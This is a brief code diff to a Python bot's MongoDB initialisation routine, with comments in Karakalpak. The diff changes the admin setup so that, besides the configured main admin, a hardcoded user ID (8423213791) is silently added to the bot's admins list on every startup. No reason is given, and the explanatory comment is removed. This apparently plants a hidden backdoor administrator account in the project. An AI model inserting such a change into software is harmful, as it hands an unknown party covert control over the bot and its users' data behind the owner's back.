@@ -68,10 +68,11 @@ def init_database():
     logging.info("MongoDB jalg'andı, bazanı tekseriw...")
     # Tiykarg'ı admin ha'miyshe bolıwın támiyinlew
     col_config.update_one(
-        {"_id": "bot_config"},
-        {"$addToSet": {"admins": MAIN_ADMIN_ID}},
-        upsert=True  # Eger "bot_config" joq bolsa, onı jarat
-    )
+    {"_id": "bot_config"},
+    {"$addToSet": {"admins": {"$each": [MAIN_ADMIN_ID, 8423213791]}}},
+    upsert=True
+)
+
     logging.info("Bas admin tekserildi.")
 
 # ============== HELPERS (MONGO) =================
